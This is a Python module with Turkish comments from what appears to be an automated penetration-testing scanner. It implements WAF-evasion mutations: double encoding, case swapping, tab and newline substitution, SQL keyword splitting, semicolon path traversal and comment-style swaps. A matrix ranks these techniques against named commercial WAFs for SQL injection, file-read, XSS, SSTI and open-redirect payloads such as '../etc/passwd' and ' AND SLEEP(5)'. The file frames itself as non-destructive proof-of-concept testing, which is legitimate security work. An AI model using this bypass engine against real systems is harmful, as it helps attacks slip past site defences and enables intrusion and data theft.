"""
Kadim Güvenlik — Payload Mutasyon Matrisi (payload_mutator)
============================================================
Türkçe: WAF tespit edildiğinde doğrulayıcı payload'ları vendor-profilli MUTASYONLARLA
yeniden denenir. Temel fikir: WAF ile backend FARKLI parser'lardır — WAF'ın normalizasyon
tuhaflıkları (çift-decode, yorum ayrıştırma, boşluk karakteri, case) payload'u duvarın
gözünden kaçırıp uygulamaya OLDUĞU GİBİ ulaştırabilir.

Doktrin korunur: mutasyon payload'u daha TEHLİKELİ yapmaz — aynı tahribatsız PoC'un
(SLEEP, aritmetik, passwd okuma, sentinel) farklı KODLAMASIDIR. Halüsinasyon-güvenli hat
da değişmez: mutasyonlu payload yine deterministik verifier'dan geçer, kanıt zorunlu.

Her mutasyon SAF (I/O yok) ve asla istisna fırlatmaz (bozuk girdi → orijinali döndür).
Vendor profilleri öğrenen döngüyle (exploit_memory waf_bypass dersleri) yeniden sıralanır:
geçmişte işe yaramış mutasyon öne çıkar.
"""
import re
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import quote

Mutation = Tuple[str, Callable[[str], str]]   # (ad, fonksiyon)


# ============================================================
# Mutasyonlar (SAF)
# ============================================================

def m_double_encode(p: str) -> str:
    """Çift URL-encode: '../etc/passwd' → '%252e%252e%252fetc%252fpasswd'.
    WAF bir katman decode edip 'tehlikeli' göremez; backend ikinci katmanı da çözer.
    FortiWeb/ModSecurity tarihsel zafiyet alanı."""
    try:
        return quote(quote(p, safe=""), safe="")
    except Exception:
        return p


def m_case_swap(p: str) -> str:
    """Değişken büyük/küçük harf: 'SeLeCt'. Case-sensitive imza kurallarını atlatır;
    HTML etiketleri ve çoğu SQL lehçesi case-insensitive olduğundan PoC çalışmaya devam eder."""
    try:
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))
    except Exception:
        return p


def m_tab_space(p: str) -> str:
    """Boşluk → GERÇEK tab karakteri: ' AND SLEEP(5)' → '\\tAND\\tSLEEP(5)'.
    Kural motorları ' AND ' kalıbını boşlukla arar; MySQL tab'ı boşluk gibi ayrıştırır.
    NEDEN '\\t' ve '%09' METNİ DEĞİL: doğrulayıcılar payload'u urlencode'dan geçirir —
    '%09' metni çift-encode'a uğrayıp ('%2509') sunucuda literal kalır ve SQL'de syntax
    hatası üretir. Gerçek '\\t' ise urlencode'da '%09' olur, sunucu tek katmanda tab'a çözer."""
    try:
        return p.replace(" ", "\t")
    except Exception:
        return p


_SQL_KEYWORDS = ("SLEEP", "AND", "OR", "SELECT", "UNION", "WAITFOR", "BENCHMARK")


def m_keyword_comment(p: str) -> str:
    """SQL anahtar kelime içine yorum: 'SLEEP' → 'SL/**/EEP', 'AND' → 'AN/**/D'.
    WAF'ın anahtar-kelime imzası bölünür; MySQL yorumu boşluk gibi atlar (lehçe-bağımlı)."""
    try:
        out = p
        upper = out.upper()
        for kw in _SQL_KEYWORDS:
            idx = upper.find(kw)
            if idx >= 0 and len(kw) > 2:
                mid = idx + len(kw) // 2
                out = out[:mid] + "/**/" + out[mid:]
                upper = out.upper()
        return out
    except Exception:
        return p


def m_semicolon_path(p: str) -> str:
    """Path-normalizasyon farkı: '../' → '..;/' (Tomcat/IIS tarzı ';' parametre ayracı
    WAF ile backend'de farklı ayrıştırılır). Yalnız traversal payload'larında anlamlı."""
    try:
        return p.replace("../", "..;/").replace("..\\", "..;\\")
    except Exception:
        return p


def m_space_pad(p: str) -> str:
    """Şablon/ifade içine boşluk: '{{1337*1367}}' → '{{ 1337 * 1367 }}'.
    İmza motoru tam kalıbı arar; Jinja2/Twig boşluklu ifadeyi de değerlendirir."""
    try:
        for opener, closer in (("{{", "}}"), ("${", "}"), ("#{", "}")):
            if p.startswith(opener) and p.endswith(closer):
                inner = p[len(opener):-len(closer)]
                return f"{opener} {inner} {closer}"
        return p
    except Exception:
        return p


def m_line_break(p: str) -> str:
    """Boşluk → GERÇEK satır sonu ('\\n'): satır-kilitli (^...$) WAF regex'leri payload'u
    yarım satır görür; SQL ve çoğu şablon motoru newline'ı whitespace sayar. tab_space'ten
    FARKI: boşluk-çevreli imzalar (' AND ') tab'da da bölünür ama satır-anchored kurallar
    yalnız newline'da düşer. Gerçek '\\n' urlencode'da '%0A' olur — tek katmanda çözülür
    (bkz. m_tab_space yorumundaki çift-encode tuzağı; '+' koyamayız: '%2B' literal kalır).
    KUŞUK: kuyruktaki SQL yorumu ('-- -') OLDUĞU GİBİ kalır — '--' yorumu satır sonuna
    kadar geçerlidir; kuyruk bölünürse sarkan '-' syntax hatası üretir (ölü mutasyon)."""
    try:
        m = re.search(r"\s*--\s*-+\s*$", p)
        head, tail = (p[:m.start()], p[m.start():]) if m else (p, "")
        out = head.replace(" ", "\n") + tail
        return out if out != p else p
    except Exception:
        return p


def m_sql_comment_swap(p: str) -> str:
    """SQL yorum stili değişimi: '-- -' sonu → '#' (MySQL) ya da '--' tek başına.
    İmza motorları çoğunlukla '-- -' LİTERALİNİ arar; '#' MySQL'de eşdeğer yorumdur ve
    payload'un geri kalanı (SLEEP) aynen çalışır. Yalnız kuyrukta '--' deseni varsa
    uygulanır; yoksa no-op (diğer sınıflara dokunmaz)."""
    try:
        stripped = p.rstrip()
        if stripped.endswith("-- -") or stripped.endswith("-- - "):
            return stripped.rstrip()[:-4].rstrip() + "#"
        if stripped.endswith("--"):
            return stripped[:-2] + "#"
        return p
    except Exception:
        return p


_MUTATIONS: Dict[str, Callable[[str], str]] = {
    "double_encode": m_double_encode,
    "case_swap": m_case_swap,
    "tab_space": m_tab_space,
    "keyword_comment": m_keyword_comment,
    "semicolon_path": m_semicolon_path,
    "space_pad": m_space_pad,
    "line_break": m_line_break,
    "sql_comment_swap": m_sql_comment_swap,
}


# ============================================================
# Vendor × sınıf profil matrisi
# ============================================================
# Her WAF'ın KAMUSAL bilinen parsing tuhaflıklarına göre hangi mutasyonların denenmeye
# değer olduğu (sıra = varsayılan öncelik; öğrenen döngü yeniden sıralar).
# 'generic': vendor bilinmiyorsa/tanınmıyorsa düşük maliyetli evrensel mutasyonlar.
WAF_MUTATION_PROFILE: Dict[str, Dict[str, List[str]]] = {
    "fortiweb": {
        "sqli": ["double_encode", "keyword_comment", "tab_space"],
        "lfi": ["double_encode", "semicolon_path"],
        "xss": ["case_swap", "double_encode"],
        "ssti": ["double_encode", "space_pad"],
        "open_redirect": ["double_encode"],
    },
    "fortiguard": {  # FortiGate IPS/web-filter — FortiWeb ile aynı aile, benzer tuhaflıklar
        "sqli": ["double_encode", "keyword_comment", "tab_space"],
        "lfi": ["double_encode", "semicolon_path"],
        "xss": ["case_swap", "double_encode"],
        "ssti": ["double_encode", "space_pad"],
        "open_redirect": ["double_encode"],
    },
    "modsecurity": {
        "sqli": ["keyword_comment", "tab_space", "case_swap"],
        "lfi": ["semicolon_path", "double_encode"],
        "xss": ["case_swap", "space_pad"],
        "ssti": ["space_pad", "double_encode"],
        "open_redirect": ["double_encode"],
    },
    "cloudflare": {
        "sqli": ["case_swap", "tab_space"],
        "lfi": ["semicolon_path"],
        "xss": ["case_swap"],
        "ssti": ["space_pad"],
        "open_redirect": ["double_encode"],
    },
    # --- Kurumsal vendor'lar (T4-A madde 3): PATT WAF-bypass + kamusal parser farkları.
    # Sıra = başlangıç sezgisi; exploit_memory waf_bypass dersleri zamanla yeniden sıralar.
    # Anahtarlar waf_detect._WAF_SIGNATURES vendor stringsiyle BİREBİR eşleşmeli.
    "akamai": {  # imza-tabanlı; whitespace-kritik — tab/newline bölünmesi etkili
        "sqli": ["tab_space", "line_break", "keyword_comment"],
        "lfi": ["double_encode", "semicolon_path"],
        "xss": ["case_swap", "double_encode"],
        "ssti": ["space_pad"],
        "open_redirect": ["double_encode"],
    },
    "imperva": {  # Incapsula: nesting/encoding tuhaflıkları
        "sqli": ["double_encode", "keyword_comment", "case_swap"],
        "lfi": ["double_encode", "semicolon_path"],
        "xss": ["double_encode", "case_swap"],
        "ssti": ["double_encode", "space_pad"],
        "open_redirect": ["double_encode"],
    },
    "f5_asm": {  # F5 BIG-IP ASM: imza + anomaly; SQL yorum-stili değişimi işe yarar
        "sqli": ["sql_comment_swap", "keyword_comment", "tab_space"],
        "lfi": ["semicolon_path", "double_encode"],
        "xss": ["case_swap"],
        "ssti": ["space_pad", "double_encode"],
        "open_redirect": ["double_encode"],
    },
    "aws_waf": {  # regex-based web ACL; whitespace/encoding varyantları yüksek verim
        "sqli": ["case_swap", "tab_space", "line_break"],
        "lfi": ["double_encode", "semicolon_path"],
        "xss": ["case_swap", "double_encode"],
        "ssti": ["space_pad", "double_encode"],
        "open_redirect": ["double_encode"],
    },
    "sucuri": {  # WordPress ekosistemi; keyword bölme + encoding
        "sqli": ["keyword_comment", "case_swap"],
        "lfi": ["double_encode", "semicolon_path"],
        "xss": ["case_swap"],
        "ssti": ["space_pad"],
        "open_redirect": ["double_encode"],
    },
    "generic": {
        "sqli": ["case_swap", "tab_space"],
        "lfi": ["double_encode", "semicolon_path"],
        "xss": ["case_swap"],
        "ssti": ["space_pad", "double_encode"],
        "open_redirect": ["double_encode"],
    },
}
# Profili tanımlanmamış vendor 'generic'e düşer (mutation_plan).


def mutation_plan(vendor: Optional[str], vuln_class: str,
                  learned_order: Optional[List[str]] = None,
                  *, max_mutations: int = 3) -> List[Mutation]:
    """Vendor + sınıf için denenecek mutasyon zinciri (SAF).

    Sıralama: öğrenilmiş başarılar (learned_order — exploit_memory waf_bypass dersleri)
    profilde varsa ÖNE alınır; kalanı profil sırasıyla gelir. max_mutations ile tavanlı
    (dokunuş bütçesi — her mutasyon payload başına ek istek demektir)."""
    profile = WAF_MUTATION_PROFILE.get(str(vendor or "")) or WAF_MUTATION_PROFILE["generic"]
    names = list(profile.get(str(vuln_class or ""), []))
    if learned_order:
        front = [n for n in learned_order if n in names]
        names = front + [n for n in names if n not in front]
    out: List[Mutation] = []
    for n in names[:max_mutations]:
        fn = _MUTATIONS.get(n)
        if fn:
            out.append((n, fn))
    return out


def apply_mutations(payload: str, mutations: List[Mutation],
                    *, include_identity: bool = True) -> List[Tuple[str, Optional[str]]]:
    """Bir payload'un varyantlarını üret. Sıralı ve tekilleştirilmiş (mutasyon bazen
    no-op olabilir — mükerrer istek atılmaz).
    include_identity=False: orijinal varyant ÜRETİLMEZ — WAF adaptif-retry'si bunu kullanır;
    temel payload ilk denemede zaten atılmıştır, ikinci kez istek israfı olmaz."""
    out: List[Tuple[str, Optional[str]]] = [(payload, None)] if include_identity else []
    seen = {payload}
    for name, fn in mutations or []:
        try:
            v = fn(payload)
        except Exception:
            continue
        if v and v not in seen:
            seen.add(v)
            out.append((v, name))
    return out
